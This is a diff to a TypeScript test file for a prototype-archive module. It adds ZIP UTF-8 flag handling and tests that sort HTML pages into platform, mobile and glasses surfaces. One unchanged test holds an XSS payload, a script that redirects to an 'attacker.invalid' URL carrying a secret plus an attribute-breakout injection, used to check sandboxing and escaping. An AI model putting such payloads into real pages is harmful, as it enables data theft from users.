@@ -5,7 +5,7 @@ import { deflateRawSync } from 'node:zlib';
 import { runInNewContext } from 'node:vm';
 import { parse, type DefaultTreeAdapterTypes as Tree } from 'parse5';
 import { afterEach, beforeEach, describe, expect, it } from 'vitest';
-import { PrototypeArchive } from './prototype-archive';
+import { classifyPrototypeSurface, PrototypeArchive } from './prototype-archive';
 
 type FixtureEntry = { path: string; text?: string; data?: Buffer; mode?: number; flags?: number; advertised?: number };
 const crcTable = Array.from({ length: 256 }, (_, initial) => {
@@ -21,11 +21,12 @@ function zip(entries: FixtureEntry[]): Buffer {
     for (const byte of data) crc = (crc >>> 8) ^ crcTable[(crc ^ byte) & 0xff];
     crc = (crc ^ 0xffffffff) >>> 0;
     const name = Buffer.from(entry.path); const local = Buffer.alloc(30);
-    local.writeUInt32LE(0x04034b50); local.writeUInt16LE(20, 4); local.writeUInt16LE(entry.flags ?? 0, 6); local.writeUInt16LE(8, 8);
+    const flags = entry.flags ?? (/[^\x00-\x7f]/.test(entry.path) ? 0x800 : 0);
+    local.writeUInt32LE(0x04034b50); local.writeUInt16LE(20, 4); local.writeUInt16LE(flags, 6); local.writeUInt16LE(8, 8);
     local.writeUInt32LE(crc, 14); local.writeUInt32LE(compressed.length, 18); local.writeUInt32LE(entry.advertised ?? data.length, 22); local.writeUInt16LE(name.length, 26);
     locals.push(local, name, compressed);
     const central = Buffer.alloc(46); central.writeUInt32LE(0x02014b50); central.writeUInt16LE(0x0314, 4); central.writeUInt16LE(20, 6);
-    central.writeUInt16LE(entry.flags ?? 0, 8); central.writeUInt16LE(8, 10); central.writeUInt32LE(crc, 16);
+    central.writeUInt16LE(flags, 8); central.writeUInt16LE(8, 10); central.writeUInt32LE(crc, 16);
     central.writeUInt32LE(compressed.length, 20); central.writeUInt32LE(entry.advertised ?? data.length, 24); central.writeUInt16LE(name.length, 28);
     central.writeUInt32LE(((entry.mode ?? 0o100644) << 16) >>> 0, 38); central.writeUInt32LE(offset, 42);
     centrals.push(central, name); offset += local.length + name.length + compressed.length;
@@ -63,6 +64,14 @@ describe('PrototypeArchive', () => {
   let root: string; let archive: PrototypeArchive;
   beforeEach(async () => { root = await mkdtemp(join(tmpdir(), 'flowx-prototype-')); archive = new PrototypeArchive(root); });
   afterEach(async () => { await rm(root, { recursive: true, force: true }); });
+
+  it('识别常见英文端目录并避免命中英文单词内部', () => {
+    expect(classifyPrototypeSurface('platform/dashboard/index.html')).toBe('平台端');
+    expect(classifyPrototypeSurface('mobile/home/index.html')).toBe('手机端');
+    expect(classifyPrototypeSurface('smart-glasses/patrol.html')).toBe('眼镜端');
+    expect(classifyPrototypeSurface('web-site/index.html')).toBe('平台端');
+    expect(classifyPrototypeSurface('assets/glassroom/index.html')).toBe('平台端');
+  });
 
   it('以可信 CSP 外层隔离原型，完整转义 srcdoc 且不允许原型污染外层脚本', async () => {
     const attack = '<script>window.location="https://attacker.invalid/leak?secret=1"</script><p title="&quot;><script>attack()</script>">原型</p>';
@@ -315,6 +324,40 @@ describe('PrototypeArchive', () => {
     expect(manifest.pages.map(page => page.path)).toEqual(['prototype/index.htm', 'aaa.html', 'assets/logo.svg', 'aaa.md']);
     expect(manifest.files.map(file => file.path)).toEqual(['aaa.html', 'aaa.md', 'assets/logo.svg', 'prototype/index.htm']);
     expect((await archive.surfaces('draft1', 1))[0].pages[0].id).toBe('prototype/index.htm');
+  });
+
+  it('按平台规范将 ZIP 内页面归一到平台端、手机端和眼镜端', async () => {
+    await archive.save('multi-surface', 1, zip([
+      { path: '巡逻防控_V1.3/01_巡逻防控任务.html', text: '<title>平台任务</title>' },
+      { path: '巡逻防控_V1.3/02_手机端地址选择/patrol-home.html', text: '<title>手机主屏</title>' },
+      { path: '巡逻防控_V1.3/03_眼镜端交互.html', text: '<title>眼镜交互</title>' },
+      { path: '巡逻防控_V1.3/04_巡逻防控记录.html', text: '<title>记录管理</title>' },
+      { path: '巡逻防控_V1.3/05_移动端详情.html', text: '<title>移动详情</title>' },
+    ]), 'multi-surface.zip');
+
+    const surfaces = await archive.surfaces('multi-surface', 1);
+    expect(surfaces.map(surface => surface.id)).toEqual(['平台端', '手机端', '眼镜端']);
+    expect(surfaces.find(surface => surface.id === '平台端')?.pages.map(page => page.id)).toEqual([
+      '巡逻防控_V1.3/01_巡逻防控任务.html',
+      '巡逻防控_V1.3/04_巡逻防控记录.html',
+    ]);
+    expect(surfaces.find(surface => surface.id === '手机端')?.pages.map(page => page.id)).toEqual([
+      '巡逻防控_V1.3/02_手机端地址选择/patrol-home.html',
+      '巡逻防控_V1.3/05_移动端详情.html',
+    ]);
+    expect(surfaces.find(surface => surface.id === '眼镜端')?.pages.map(page => page.id)).toEqual([
+      '巡逻防控_V1.3/03_眼镜端交互.html',
+    ]);
+    const context = await archive.context('multi-surface', 1);
+    expect(context).toContain('"surface":"手机端"');
+    expect(context).toContain('"surface":"眼镜端"');
+  });
+
+  it('未标明端的材料默认归入平台端并保留原始页面标识', async () => {
+    await archive.save('default-surface', 1, zip([{ path: 'index.html', text: '<title>首页</title>' }]), 'default.zip');
+    const surfaces = await archive.surfaces('default-surface', 1);
+    expect(surfaces).toHaveLength(1);
+    expect(surfaces[0]).toMatchObject({ id: '平台端', pages: [{ id: 'index.html' }] });
   });
   it('AI材料保留链接与表单属性，清单和分隔符也计入整体预算', async () => {
     await archive.save('draft1', 1, zip([{ path: 'index.html', text: '<a href="detail.html">查看</a><form action="/orders"><input name="email" type="email" required><button data-action="delete">删除</button></form>' }]), 'form.zip');
